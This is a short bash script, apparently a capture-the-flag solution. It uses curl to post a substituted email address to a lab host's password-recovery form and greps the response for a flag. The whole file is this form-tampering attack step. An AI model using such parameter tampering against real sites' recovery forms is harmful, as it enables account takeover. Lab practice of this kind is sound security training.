#!/bin/bash
curl "http://10.0.2.15/index.php?page=recover" --data "mail=vinumahey%40emailsy.info&Submit=Submit" 2>/dev/null | grep -i flag
